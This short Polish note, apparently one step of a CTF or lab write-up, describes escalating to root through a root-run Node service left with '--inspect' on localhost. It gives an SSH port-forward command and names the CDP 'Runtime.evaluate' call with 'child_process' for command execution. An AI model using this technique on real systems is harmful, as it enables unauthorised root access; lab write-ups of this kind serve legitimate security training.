# 04 — Root przez Node --inspect

`systemctl cat uptime-monitor`:
- User=**root**
- `--inspect=127.0.0.1:9229`

Kali:
1. `ssh -L 9229:127.0.0.1:9229 engineer@IP`
2. CDP `Runtime.evaluate` z `process.mainModule.require('child_process')`

Skrypt: `scripts/root-inspect-cdp.py`

Dlaczego: brak snap/LXD, debugger już był na maszynie.
